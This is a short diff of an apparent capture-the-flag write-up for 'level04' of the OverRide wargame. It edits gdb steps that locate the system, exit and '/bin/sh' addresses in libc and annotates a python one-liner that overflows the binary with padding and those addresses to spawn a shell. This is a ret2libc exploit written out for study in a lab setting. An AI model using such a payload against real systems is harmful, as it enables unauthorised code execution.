@@ -41,14 +41,13 @@ Mapped address spaces:
         0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
 [...]
 
-(gdb) p/x "/bin/sh"
-$3 = {0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x0}
-(gdb) find /b 0xf7e2c000, 0xf7fd0000, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x0                     
+(gdb) find 0xf7e2c000, 0xf7fd0000 "/bin/sh"
 0xf7f897ec
 ```
 Okay, `system -> 0xf7e6aed0` `exit -> 0xf7e5eb70` `"/bin/sh" -> 0xf7f897ec`
 
 ```shell
+# Padding + system + exit + "/bin/sh"
 level04@OverRide:~$ (python -c 'print "B"*156 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7"' ; cat) | ./level04 
 Give me some shellcode, k
 whoami
